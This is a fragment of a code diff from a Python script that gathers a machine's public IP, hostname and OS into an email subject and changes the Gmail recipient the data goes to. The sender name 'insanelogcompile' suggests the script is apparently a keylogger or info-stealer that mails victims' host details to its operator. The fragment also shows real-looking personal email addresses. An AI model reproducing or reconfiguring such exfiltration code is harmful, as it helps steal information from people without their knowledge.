@@ -97,7 +97,7 @@ public = public_ip()
 computer_name = platform.node()
 computer_os = platform.system()
 subject = '{} / {} // {} / {}'.format(computer_os, computer_name, public, local)
-to = 'bradshawcantos@gmail.com'
+to = 'loglogsnd@gmail.com'
 sender = 'insanelogcompile@gmail.com'
 
 def main(): 
